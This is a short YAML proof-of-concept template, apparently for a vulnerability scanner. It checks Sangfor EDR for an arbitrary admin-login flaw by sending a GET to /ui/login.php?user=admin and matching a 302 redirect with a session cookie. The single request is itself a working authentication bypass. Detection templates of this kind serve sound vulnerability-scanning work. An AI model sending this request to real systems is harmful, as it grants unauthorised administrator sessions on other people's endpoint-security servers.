detail:
  author: hilson
  links:
  - https://mp.weixin.qq.com/s/6aUrXcnab_EScoc0-6OKfA
expression: r0()
manual: true
name: poc-yaml-sangfor-edr-arbitrary-admin-login
rules:
  r0:
    expression: response.status == 302 && response.body.bcontains(b"/download/edr_installer_")
      && response.headers["Set-Cookie"] != ""
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /ui/login.php?user=admin
transport: http
